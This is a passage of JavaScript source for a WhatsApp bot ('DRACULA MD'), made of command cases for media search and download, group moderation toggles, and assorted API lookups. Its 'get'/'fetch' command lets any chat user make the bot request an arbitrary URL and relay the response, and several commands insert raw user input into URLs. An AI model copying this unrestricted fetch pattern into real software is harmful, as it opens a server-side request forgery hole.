        reply(`*🔤 𝔻𝕖𝕔𝕠𝕕𝕖𝕕 𝕋𝕖𝕩𝕥:*\n\n\`\`\`${json.text}\`\`\``);

    } catch (error) {
        console.error("Error in decode case:", error);
        reply("𝔸𝕟 𝕖𝕣𝕣𝕠𝕣 𝕠𝕔𝕔𝕦𝕣𝕣𝕖𝕕 𝕨𝕙𝕚𝕝𝕖 𝕡𝕣𝕠𝕔𝕖𝕤𝕤𝕚𝕟𝕘 𝕪𝕠𝕦𝕣 𝕣𝕖𝕢𝕦𝕖𝕤𝕥. ℙ𝕝𝕖𝕒𝕤𝕖 𝕥𝕣𝕪 𝕒𝕘𝕒𝕚𝕟 𝕝𝕒𝕥𝕖𝕣.");
    }
    break;
}



case 'join': {
await loading();
    if (!isOwner) return onlyOwner();
    let link = q.startsWith("http");
    if (!link) return reply(`𝕊𝕖𝕟𝕕 𝕥𝕙𝕖 𝕔𝕠𝕞𝕞𝕒𝕟𝕕 ${command} _𝕘𝕣𝕠𝕦𝕡𝕃𝕚𝕟𝕜_`);
    var url = args[1];
    let ano = q.split('https://chat.whatsapp.com/')[1];
    await conn.groupAcceptInvite(ano);
    reply("𝕊𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝𝕝𝕪 𝕛𝕠𝕚𝕟𝕖𝕕 𝕥𝕙𝕖 𝕘𝕣𝕠𝕦𝕡");
}
break;





case 'antilink':{
    if (!isGroup) return onlyGroup()
    if (!isGroupAdmins && !isOwner) return onlyBadmin()
    await loading();
    if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1') {
        if (isAntiLink) return reply('⚡ A N T I - L I N K I S A L R E A D Y A C T I V E ⚡')
        db.data.chats[from].antilink = true
        let ih = `⚡ A N T I - L I N K F E A T U R E H A S B E E N E N A B L E D ⚡`
        reply(ih)
    } else if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (!isAntiLink) return reply('⚡ A N T I - L I N K I S D I S A B L E D ⚡')
        db.data.chats[from].antilink = false
        let ih = `⚡ A N T I - L I N K F E A T U R E H A S B E E N D I S A B L E D ⚡`
        reply(ih)
    } else if (!q) {
        reply(`*A N T I - L I N K M O D E*\n ${prefix+command} on/off`)
    }
}
break;

case 'antilinkgc':{
    if (!isGroup) return onlyGroup()
    if (!isGroupAdmins && !isOwner) return onlyBadmin()
    await loading();
    if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1') {
        if (isAntilinkGc) return reply('⚡ G R O U P A N T I - L I N K I S A L R E A D Y A C T I V E ⚡')
        db.data.chats[from].antilinkgc = true
        let ih = `⚡ G R O U P A N T I - L I N K F E A T U R E H A S B E E N E N A B L E D ⚡`
        reply(ih)
    } else if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (!isAntilinkGc) return reply('⚡ G R O U P A N T I - L I N K I S D I S A B L E D ⚡')
        db.data.chats[from].antilinkgc = false
        let ih = `⚡ G R O U P A N T I - L I N K F E A T U R E H A S B E E N D I S A B L E D ⚡`
        reply(ih)
    } else if (!q) {
        reply(`*G R O U P A N T I - L I N K M O D E*\n ${prefix+command} on/off`)
    }
}
break;


case 'antibot':{
  if (!isGroup) return onlyGroup()
  if (!isGroupAdmins && !isOwner) return onlyAdmin()
  if (args.length < 1) return reply('🔥 𝒶𝓃𝓉𝒾-𝒷𝑜𝓉 𝓂𝑜𝒹𝑒: 𝑜𝓃/𝑜𝓯𝒻? 🔥')
  if (args[0] === 'on') {
    db.data.chats[from].antibot = true
    reply(`🚀 ${command} 𝗶𝘀 𝗲𝗻𝗮𝗯𝗹𝗲𝗱 🚀`)
  } else if (args[0] === 'off') {
    db.data.chats[from].antibot = false
    reply(`⚡ ${command} 𝗶𝘀 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 ⚡`)
  }
}
break

case 'welcome': {
    // Check if the query is provided
    if (!q) return reply("𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚊 𝚚𝚞𝚎𝚛𝚢: '𝚘𝚗' 𝚘𝚛 '𝚘𝚏𝚏'.");
    
    // Check if the group is registered in the bot's database
    if (!chat) return reply("𝚃𝚑𝚒𝚜 𝚐𝚛𝚘𝚞𝚙 𝚒𝚜 𝚗𝚘𝚝 𝚛𝚎𝚐𝚒𝚜𝚝𝚎𝚛𝚎𝚍 𝚒𝚗 𝚝𝚑𝚎 𝚋𝚘𝚝'𝚜 𝚍𝚊𝚝𝚊𝚋𝚊𝚜𝚎.");
    
    // Handle the 'on' query
    if (q === 'on') {
        if (chat.welcome === true) return reply("🔥 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚒𝚜 𝚊𝚕𝚛𝚎𝚊𝚍𝚢 𝚎𝚗𝚊𝚋𝚕𝚎𝚍! 🔥");
        db.data.chats[from].welcome = true;
        reply("✅ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎𝚜 𝚑𝚊𝚟𝚎 𝚋𝚎𝚎𝚗 𝚎𝚗𝚊𝚋𝚕𝚎𝚍 𝚏𝚘𝚛 𝚝𝚑𝚒𝚜 𝚐𝚛𝚘𝚞𝚙!");
    } 
    
    // Handle the 'off' query
    else if (q === 'off') {       
        if (chat.welcome === false) return reply("🚫 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚒𝚜 𝚊𝚕𝚛𝚎𝚊𝚍𝚢 𝚍𝚒𝚜𝚊𝚋𝚕𝚎𝚍! 🚫");
        db.data.chats[from].welcome = false;
        reply("❌ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎𝚜 𝚑𝚊𝚟𝚎 𝚋𝚎𝚎𝚗 𝚍𝚒𝚜𝚊𝚋𝚕𝚎𝚍 𝚏𝚘𝚛 𝚝𝚑𝚒𝚜 𝚐𝚛𝚘𝚞𝚙!");
    } 
    
    // Handle invalid queries
    else {
        reply("❓ 𝙿𝚕𝚎𝚊𝚜𝚎 𝚌𝚑𝚘𝚘𝚜𝚎 '𝚘𝚗' 𝚘𝚛 '𝚘𝚏𝚏'. ❓");
    }
}
break;






case 'pinterest': 
case 'pin': {
    if (!q) return reply("✏️ *𝓟𝓵𝓮𝓪𝓼𝓮 𝓮𝓷𝓽𝓮𝓻 𝓪 𝓺𝓾𝓮𝓻𝔂 𝓽𝓸 𝓼𝓮𝓪𝓻𝓬𝓱!*\n\n𝓔𝓧𝓐𝓶𝓹𝓵𝓮: `pin sunset`");
    await loading();
    await reply("⏳ *𝓢𝓮𝓪𝓻𝓬𝓱𝓲𝓷𝓰 𝓯𝓸𝓻 𝓲𝓶𝓪𝓰𝓮𝓼...*");

    const shuffleArray = (array) => {
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [array[i], array[j]] = [array[j], array[i]];
        }
    };

    try {
        let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${q}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${q}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let images = data.resource_response.data.results.map(v => v.images.orig.url);

        shuffleArray(images); // Shuffle the images array
        let selectedImages = images.slice(0, 5); // Take the first 5 images after shuffling

        for (let i = 0; i < selectedImages.length; i++) {
            let caption = `
✨ *𝐏𝐢𝐧𝐭𝐞𝐫𝐞𝐬𝐭 𝐒𝐞𝐚𝐫𝐜𝐡 𝐑𝐞𝐬𝐮𝐥𝐭* ✨
🌟 *Query:* ${q}
🖼️ *Image:* ${i + 1}/${selectedImages.length}

            `.trim();

            await conn.sendMessage(from, {
                image: { url: selectedImages[i] },
                caption,
            }, { quoted: m });
        }
    } catch (err) {
        reply("⚠️ *𝓢𝓸𝓻𝓻𝔂, 𝓬𝓸𝓾𝓵𝓭 𝓷𝓸𝓽 𝓯𝓲𝓷𝓭 𝓪𝓷𝔂 𝓲𝓶𝓪𝓰𝓮𝓼.*\n\n𝓟𝓵𝓮𝓪𝓼𝓮 𝓽𝓻𝔂 𝓪𝓰𝓪𝓲𝓷 𝔀𝓲𝓽𝓱 𝓪 𝓭𝓲𝓯𝓯𝓮𝓻𝓮𝓷𝓽 𝓺𝓾𝓮𝓻𝔂.");
    }
}
break;

case 'element': {
    if (!q) return reply("✏️ *𝓟𝓵𝓮𝓪𝓼𝓮 𝓮𝓷𝓽𝓮𝓻 𝓪𝓷 𝓮𝓁𝓮𝓂𝓮𝓷𝓉 𝓷𝓪𝓶𝓮 𝓸𝓻 𝓼𝓎𝓂𝓫𝓸𝓁.*\n\n𝓔𝓧𝓐𝓶𝓹𝓵𝓮: `element bohrium`");
    loading();

    let Url = `https://api.popcat.xyz/periodic-table?element=${q}`;

    fetch(Url)
        .then(res => res.json())
        .then(data => {
            // Log the response data for debugging
            console.log('Response Data:', data);

            if (data.error) {
                return reply("⚠️ *𝓔𝓁𝓮𝓂𝓮𝓷𝓽 𝓷𝓸𝓽 𝓯𝓸𝓾𝓷𝓭!*\n\n𝓜𝓪𝓴𝓮 𝓼𝓾𝓻𝓮 𝓽𝓱𝓮 𝓮𝓁𝓮𝓂𝓮𝓷𝓉 𝓷𝓪𝓶𝓮 𝓸𝓻 𝓼𝓎𝓂𝓫𝓸𝓁 𝓲𝓼 𝓬𝓸𝓻𝓻𝓮𝓬𝓽.");
            }

            const readmore = '\u200b'.repeat(4000);

            // Updated caption styling
            let caption = `
\`\`\`⚛️ 𝐏𝐞𝐫𝐢𝐨𝐝𝐢𝐜 𝐓𝐚𝐛𝐥𝐞 𝐄𝐥𝐞𝐦𝐞𝐧𝐭: ${data.name.toUpperCase()} ${readmore}

🧪 𝗦𝘆𝗺𝗯𝗼𝗹: ${data.symbol}
🔢 𝗔𝘁𝗼𝗺𝗶𝗰 𝗡𝘂𝗺𝗯𝗲𝗿: ${data.atomic_number}
📦 𝗔𝘁𝗼𝗺𝗶𝗰 𝗠𝗮𝘀𝘀: ${data.atomic_mass}
🔴 𝗣𝗲𝗿𝗶𝗼𝗱: ${data.period}
⚗️ 𝗣𝗵𝗮𝘀𝗲: ${data.phase}
🌐 𝗗𝗶𝘀𝗰𝗼𝘃𝗲𝗿𝗲𝗱 𝗕𝘆: ${data.discovered_by || 'Unknown'}

📜 𝗦𝘂𝗺𝗺𝗮𝗿𝘆: ${data.summary || 'No summary available.'}\`\`\`
            `;

            conn.sendMessage(from, {
                image: { url: data.image },
                caption: caption.trim(),
            }, { quoted: m });
        })
        .catch((err) => reply("⚠️ *𝒮𝑒𝓇𝓋𝑒𝓇 𝑒𝓇𝓇𝓸𝓇!*\n\n𝒫𝓁𝑒𝒶𝓈𝑒 𝓉𝓇𝓎 𝒶𝑔𝒶𝒾𝓃 𝓁𝒶𝓉𝑒𝓇."));
}
break;


case 'mediafire': {
    await loading();

    // Check if the user has provided a MediaFire link
    if (!q) return reply("𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗠𝗲𝗱𝗶𝗮𝗙𝗶𝗿𝗲 𝗹𝗶𝗻𝗸.");

    // API URL to fetch the media information
    const apiUrl = `https://api.agatz.xyz/api/mediafire?url=${q}`;

    try {
        // Fetch the data from the API
        const res = await fetch(apiUrl);
        const data = await res.json();

        // Check if the response is successful
        if (data.status !== 200) {
            return reply("𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗳𝗲𝘁𝗰𝗵 𝘁𝗵𝗲 𝗳𝗶𝗹𝗲 𝗱𝗲𝘁𝗮𝗶𝗹𝘀. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗺𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘁𝗵𝗲 𝗹𝗶𝗻𝗸 𝗶𝘀 𝗩𝗮𝗹𝗶𝗱.");
        }

        // Extract file details from the response
        const fileData = data.data[0];
        const fileName = fileData.nama; // File name
        const fileSize = fileData.size; // File size
        const downloadLink = fileData.link; // Download link (will not be shown to the user)

        // Display file details (without the download link)
        const caption = `
*𝗙𝗶𝗹𝗲 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:*
🧳 *𝗦𝗶𝘇𝗲*: ${fileSize}
📄 *𝗡𝗮𝗺𝗲*: ${fileName}
        `;

        reply(caption);

        // Send the file via WhatsApp using the download link
        await conn.sendMessage(from, {
            document: { url: downloadLink },
            mimetype: 'application/octet-stream',
            fileName: fileName
        }).catch(e => console.log("Error sending file:", e));

    } catch (error) {
        console.log("Error fetching MediaFire file details:", error);
        return reply("𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗲𝗱 𝘄𝗵𝗶𝗹𝗲 𝗳𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝘁𝗵𝗲 𝗳𝗶𝗹𝗲 𝗱𝗲𝘁𝗮𝗶𝗹𝘀.");
    }
}
break;

   
case 'txt2pdf': {
    await loading();  // Show loading while processing
    if (!q) return reply("Please provide the text to be converted into PDF.");
    
    // API URL
    const apiUrl = `https://bk9.fun/tools/pdf?q=${encodeURIComponent(q)}`;

    try {
        // Fetch the PDF
        const response = await fetch(apiUrl);

        // Check if the response is ok
        if (!response.ok) {
            return reply("Failed to generate the PDF. Please try again later.");
        }

        // Convert the response to a blob
        const buffer = await response.buffer();

        // Send the generated PDF as a document
        await conn.sendMessage(from, {
            document: buffer,
            fileName: "𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳 𝙿𝙳𝙵",
            mimetype: 'application/pdf',
        }, { quoted: m });

    } catch (error) {
        console.error("Error generating PDF:", error);
        reply("An error occurred while generating the PDF. Please try again later.");
    }
}
break;


case 'aidetect': {
  await loading();

  // Ensure the user has input text (q)
  if (!q) return reply("✏️ *Please provide text for detection.*");

  // URL to the AI detection API
  const apiUrl = `https://bk9.fun/tools/txtdetect?q=${encodeURIComponent(q)}`;

  try {
    // Fetch the detection result from the API
    const response = await fetch(apiUrl);
    const data = await response.json();

    // Check if the API request was successful
    if (data.status && data.BK9.success) {
      const { feedback, detected_language, originalParagraph, specialSentences } = data.BK9.data;

      // Prepare the response message
      let message = `
*AI Detection Result:*

📝 *Original Text:* ${originalParagraph}

🗣️ *Feedback:* ${feedback}
🌐 *Detected Language:* ${detected_language}

*Special Sentences Detected:*
${specialSentences.length > 0 ? specialSentences.join(', ') : 'No special sentences detected.'}
      `;

      // Send the result back to the user
      reply(message);
    } else {
      return reply("❌ Error: Unable to detect text. Please try again.");
    }
  } catch (e) {
    console.error('Error during AI detection:', e);
    reply("❌ There was an error processing your request. Please try again later.");
  }
}
break;


case 'apkid': {
    await loading();  // Show loading indicator

    if (!q) return reply("Please provide an app name to search for."); // If no query, ask for input

    // Construct the URL for the API request
    const apiUrl = `https://bk9.fun/search/apk?q=${encodeURIComponent(q)}`;

    try {
        // Fetch the API response
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Check if the API returned a valid response
        if (data.status === true) {
            // Create a message with the found apps' details
            let appList = data.BK9.map(app => `🔹 *${app.name}* (ID: ${app.id})`).join("\n");

            // Caption to send without the image
            const caption = `
            *APK Search Results for:* ${q}

            ${appList}
            `;

            // Send the caption only, without the image
            await conn.sendMessage(from, {
                text: caption
            });
        } else {
            // If the API response is not successful
            return reply("No results found for the given app name.");
        }
    } catch (error) {
        console.log("Error fetching APK data:", error);
        return reply("An error occurred while fetching APK data.");
    }
}
break;

case 'apk': {
    await loading(); // Show loading indicator

    if (!q) return reply("Please provide an app name or package to search for.");

    // Construct the URL for the API request
    const apiUrl = `https://bk9.fun/download/apk?id=${encodeURIComponent(q)}`;

    try {
        // Fetch the API response
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Check if the API returned a valid response
        if (data.status === true) {
            // Directly extract app details from the response
            const { name, lastup, icon, dllink } = data.BK9;

            // Create the caption message
            const caption = `
*App Name:* ${name}
*Last Update:* ${lastup}
            `;

            // Send the app icon as the image and the caption with app details
            await conn.sendMessage(from, {
                image: { url: icon },
                caption: caption
            });

            // Send the app download link as a file (WhatsApp file)
            await conn.sendMessage(from, {
                document: { url: dllink },
                mimetype: "application/vnd.android.package-archive", // APK mime type
                fileName: `${name}.apk`
            });

        } else {
            // If no valid result is returned from the API
            return reply("No results found for the provided app ID.");
        }
    } catch (error) {
        console.log("Error fetching APK data:", error);
        return reply("An error occurred while fetching the APK data.");
    }
}
break;


case 'population': {
    await loading(); // Show loading indicator

    // Construct the URL for the API request
    const apiUrl = 'https://bk9.fun/details/population';

    try {
        // Fetch the API response
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Check if the API returned a valid response
        if (data.status === true) {
            // Extract relevant information from the response
            const current = data.BK9.current;
            const thisYear = data.BK9.this_year;
            const today = data.BK9.today;

            // Format the response as a caption
            const caption = `
*🌍 Global Population Overview 🌍*

*Current Population:*
👨‍👩‍👧‍👦 Total: ${current.total}
👨 Male: ${current.male}
👩 Female: ${current.female}

*This Year:*
🍼 Births: ${thisYear.births}
⚰️ Deaths: ${thisYear.deaths}

*Today's Statistics:*
🍼 Births Today: ${today.births}
⚰️ Deaths Today: ${today.deaths}
            `;

            // Send the data with the image
            await conn.sendMessage(from, {
                image: { url: 'https://pomf2.lain.la/f/dbogd7ch.jpg' },
                caption: caption
            });
        } else {
            return reply("Error: No valid data available.");
        }
    } catch (error) {
        console.log("Error fetching population data:", error);
        return reply("An error occurred while fetching the population data.");
    }
}
break;



case 'randomcolor': {
    await loading(); // Show loading indicator

    // API URL for fetching random color details
    const apiUrl = `https://api.popcat.xyz/randomcolor`;

    try {
        // Fetch the API response
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Check if the API returned valid data
        if (data.hex && data.name && data.image) {
            // Create the caption message with color details and more mature emojis
            const caption = `
🌈 *Color Name:* ${data.name}  
🎨 *Hex Code:* ${data.hex}  

> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳 𝙸𝚂 𝙺𝙸𝙽𝙶 🔥
            `;

            // Send the color image along with the caption
            await conn.sendMessage(from, {
                image: { url: data.image },
                caption: caption
            });
        } else {
            return reply("Error: Could not fetch random color details.");
        }
    } catch (error) {
        console.log("Error fetching random color data:", error);
        return reply("An error occurred while fetching the random color data.");
    }
}
break;

case 'checkhex': {
    await loading(); // Show loading indicator

    // Ensure that the user has provided a hex code
    if (!q) return reply("Please provide a hex code for the color.");

    // Construct the URL for the API request with the provided hex code
    const apiUrl = `https://api.popcat.xyz/color/${encodeURIComponent(q)}`;

    try {
        // Fetch the API response
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Check if the API returned valid data
        if (data.hex && data.name && data.rgb && data.color_image) {
            // Create the caption message with color details
            const caption = `
🌈 *Color Name:* ${data.name}  
🎨 *Hex Code:* ${data.hex}  
🌿 *RGB Value:* ${data.rgb}  
💡 *Brightened Color:* ${data.brightened}  

> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳 𝙸𝚂 𝙺𝙸𝙽𝙶 🔥
            `;

            // Send the color image along with the caption
            await conn.sendMessage(from, {
                image: { url: data.color_image },
                caption: caption
            });
        } else {
            return reply("Error: Could not fetch color details for the provided hex code.");
        }
    } catch (error) {
        console.log("Error fetching color data:", error);
        return reply("An error occurred while fetching the color data.");
    }
}
break;




case 'obfuscate': {
    await loading(); // Show loading indicator

    // Check if the user provided the code (via q)
    if (!q) return reply("Please provide the code to obfuscate.");

    // API URL for obfuscating the code
    const apiUrl = `https://api.giftedtech.my.id/api/tools/encrypt?apikey=gifted&code=${encodeURIComponent(q)}`;

    try {
        // Fetch the response from the API
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Check if the response contains the encrypted code
        if (data.success) {
            // Get the encrypted code
            const encryptedCode = data.encrypted_code;

            // Create the caption message with fancy font for the encrypted variable
            const caption = `
*💀 Encrypted Code 💀*

\`\`\`
${encryptedCode}
\`\`\`
            `;

            // Send the encrypted code as a message with the formatted caption
            await conn.sendMessage(from, {
                text: caption
            });
        } else {
            return reply("Error: Could not encrypt the code. Please try again.");
        }
    } catch (error) {
        console.log("Error fetching encrypted code:", error);
        return reply("An error occurred while encrypting the code.");
    }
}
break;

case 'fonts': {
    await loading(); // Show loading indicator

    // Check if q is provided (the text to obfuscate)
    if (!q) return reply("Please provide the text to fancy-up.");

    // API URL for fancy text generation
    const apiUrl = `https://api.giftedtech.my.id/api/tools/fancy?apikey=gifted&text=${encodeURIComponent(q)}`;

    try {
        // Fetch the API response
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Check if the response contains results
        if (data.success) {
            // Extract the results from the API response
            const results = data.results.map(result => result.result).join("\n\n");

            // Create the caption message with the formatted "results"
            const caption = `
*💬 Fancy Text Results 💬*

\`\`\`
${results}
\`\`\`

> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳 𝙸𝚂 𝙺𝙸𝙽𝙶 🔥
            `;

            // Send the fancy text results as a message with the formatted caption
            await conn.sendMessage(from, {
                text: caption
            });
        } else {
            return reply("Error: Could not fancy up the text. Please try again.");
        }
    } catch (error) {
        console.log("Error fetching fancy text:", error);
        return reply("An error occurred while generating fancy text.");
    }
}
break;

case 'define': {
    await loading(); // Show loading indicator

    // Check if q is provided (the word to define)
    if (!q) return reply("Please provide a word to define.");

    // API URL for word definition
    const apiUrl = `https://api.giftedtech.my.id/api/tools/define?apikey=gifted&term=${encodeURIComponent(q)}`;

    try {
        // Fetch the API response
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Check if the response contains results
        if (data.success && data.results.length > 0) {
            // Extract the first definition from the results
            const result = data.results[0];
            const word = result.word;
            const definition = result.definition;

            // Format the message
            const formattedMessage = `
*🔤 Word to Define: ${word} 🔤*

*Definition:*
\`\`\`
${definition}
\`\`\`

> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳 𝙸𝚂 𝙺𝙸𝙽𝙶 
            `;

            // Send the formatted message with the definition
            await conn.sendMessage(from, {
                text: formattedMessage
            });
        } else {
            return reply("Sorry, no definition found for that word.");
        }
    } catch (error) {
        console.log("Error fetching definition:", error);
        return reply("An error occurred while fetching the definition.");
    }
}
break;

case 'play2': {
    if (!q) {
        return reply("`No music title detected.`\n*Example: play2 Alan Walker - Faded*");
    }

    try {
        // Simulate loading (optional: use your loading indicator here)
        await loading();

        // Step 1: Search for the song on YouTube using yts
        const searchResults = await yts(q);

        if (!searchResults || !searchResults.videos || searchResults.videos.length === 0) {
            return reply("No results found for the provided song name.");
        }

        // Extract the first video details
        const video = searchResults.videos[0];
        const videoUrl = video.url;
        const videoTitle = video.title;
        const videoThumbnail = video.thumbnail;

        // Step 2: Fetch audio download details from the API
        const apiUrl = `https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;

        let downloadResponse;
        try {
            downloadResponse = await axios.get(apiUrl);
        } catch (downloadError) {
            console.error("Error fetching download details:", downloadError.message);
            return reply("Failed to fetch audio download details. Please try again later.");
        }

        const downloadData = downloadResponse.data;

        // Validate API response
        if (!downloadData.success || downloadData.status !== 200 || !downloadData.result) {
            return reply("Failed to fetch audio download details. Please try again later.");
        }

        // Step 3: Extract audio details
        const { download_url } = downloadData.result;

        // Send the song image with details
        await conn.sendMessage(m.chat, {
            image: { url: videoThumbnail },
            caption: `🎵 *Song Title:* ${videoTitle}\n\nEnjoy your music!`,
        }, { quoted: m });

        // Send the audio as a recording
        await conn.sendMessage(m.chat, {
            audio: { url: download_url },
            mimetype: "audio/mp4",
            fileName: `${videoTitle}.mp3`,
            ptt: true, // Sends it as a voice message
        }, { quoted: m });

    } catch (error) {
        console.error("Error in play2 case:", error.message);
        reply("An unexpected error occurred while processing your request. Please try again later.");
    }
    break;
}


case "get":
    case "fetch":
    await loading();
      if (!q) {
        return reply(`Example:\n${prefix + command} https://github.com/DRACULAFX`);
      }
      if (!/^https?:\/\//.test(q)) {
        return reply("URL is Invalid!");
      }
      var requestOptions = {
        method: "GET",
        redirect: "follow",
      };
      if (body.match(/(mp4)/gi)) {
        fetch(`${q}`, requestOptions)
          .then((res) => conn.sendMessage(from, { video: { url: `${q}` }, mimetype: "video/mp4", caption: "Success" }, { quoted: m }))
          .catch((error) => reply("Error", error));
      } else if (body.match(/(mp3)/gi)) {
        fetch(`${q}`, requestOptions)
          .then((res) => conn.sendMessage(from, { audio: { url: `${q}` }, mimetype: "audio/mp4", fileName: "Audio" }, { quoted: m }))
          .catch((error) => reply("Error", error));
      } else if (body.match(/(png|jpg|jpeg)/gi)) {
        fetch(`${q}`, requestOptions)
          .then((res) => conn.sendMessage(from, { image: { url: `${q}` }, caption: "Success" }, { quoted: m }))
          .catch((error) => reply("Error", error));
      } else {
        fetch(`${q}`, requestOptions)
          .then((response) => response.text())
          .then((result) => setReply(result))
          .catch((error) => reply("Error", error));
      }
      break;





   













case 'shorten': {
await loading();
  if (args.length < 1) return reply("Please enter a link.");
  if (!isUrl) return reply("Please enter a valid link.");
  
  const fetchText = (url, options) => {
    return new Promise((resolve, reject) => {
      fetch(url, options)
        .then(response => response.text())
        .then(text => resolve(text))
        .catch(err => {
          console.log(color(err, 'red'));
          reject(err);
        });
    });
  };
  
  let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`);
  let shorti = `*${okok}*`;
  reply(shorti);
}
break;



case 'ping': {
await loading();
  const startTime = new Date();
  const pingMsg = await conn.sendMessage(m.chat, { 
    text: '🔄 *𝙳𝚁𝙰𝙲𝚄𝙻𝙰* 🔄\n\n🕒 *Checking Speed...*' 
  });

  // Delay before editing the message
  setTimeout(async () => {
    await conn.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `
━━━━━━━━━━━━━━━━━━━━━
⚡ *𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳 𝚂𝙿𝙴𝙴𝙳* ⚡
📶 *Response Time:* 
${new Date() - startTime} 𝙼𝚂
━━━━━━━━━━━━━━━━━━━━━
🚀 *Optimized for Speed!*

> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰  𝙼𝙳
          `.trim()
        }
      }
    }, {});
  }, 1000); // 1000 ms delay (1 second)
}
break;


case 'public': {
    if (!isOwner) return onlyOwner(); // Ensures only the owner can use the command
    if (publik) return reply('ᴛʜᴇ ʙᴏᴛ ɪs ᴀʟʀᴇᴀᴅʏ ɪɴ ᴘᴜʙʟɪᴄ ᴍᴏᴅᴇ.'); // If already in public mode
    publik = true;
    let message = `𝗣𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲𝗱.`;
    reply(message); // Sends confirmation message
    break;
}

case 'self': {
await loading();
    if (!isOwner) return onlyOwner(); // Ensures only the owner can use the command
    if (publik === false) return reply('ᴛʜᴇ ʙᴏᴛ ɪs ᴀʟʀᴇᴀᴅʏ ɪɴ 𝒮𝑒𝓁𝒻 𝑀𝑜𝒹𝑒'); // If already in self mode
    publik = false;
    let message = `𝒮𝑒𝓁𝒻 𝑀𝑜𝒹𝑒 𝒽𝒶𝓈 𝒷𝑒𝑒𝓃 𝓈𝓊𝒸𝒸𝑒𝓈𝓈𝒻𝓊𝓁𝓁𝓎 𝒶𝒸𝓉𝒾𝓋𝒶𝓉𝑒𝒹.`;
    reply(message); // Sends confirmation message
    break;
}

case 'mode': {
    let currentMode = publik ? 'ℙ𝕦𝕓𝕝𝕚𝕔 𝕄𝕠𝕕𝕖' : '𝕊𝕖𝕝𝕗 𝕄𝕠𝕕𝕖'; // Determine the current mode
    let message = `𝕋𝕙𝕖 𝕓𝕠𝕥 𝕚𝕤 𝕔𝕦𝕣𝕣𝕖𝕟𝕥𝕝𝕪 𝕚𝕟 ${currentMode}.`; // Message indicating the current mode
    reply(message); // Sends the current mode
    break;
}





case 'anticall': {
    if (!isOwner) return onlyOwner(); // Ensures only the owner can use the command
    if (!args[0]) return reply('⛓️ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐩𝐞𝐜𝐢𝐟𝐲 "𝐨𝐧" 𝐨𝐫 "𝐨𝐟𝐟".'); // Ensures the user specifies an argument

    await loading(); // Simulates a loading action

    if (args[0].toLowerCase() === 'on') {
        if (global.anticall) return reply('🚫 𝐀𝐧𝐭𝐢𝐜𝐚𝐥𝐥 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐞𝐧𝐚𝐛𝐥𝐞𝐝.');
        global.anticall = true;
        reply('✅ 𝐀𝐧𝐭𝐢𝐜𝐚𝐥𝐥 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐞𝐧𝐚𝐛𝐥𝐞𝐝.');
    } else if (args[0].toLowerCase() === 'off') {
        if (!global.anticall) return reply('🚫 𝐀𝐧𝐭𝐢𝐜𝐚𝐥𝐥 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐝𝐢𝐬𝐚𝐛𝐥𝐞𝐝.');
        global.anticall = false;
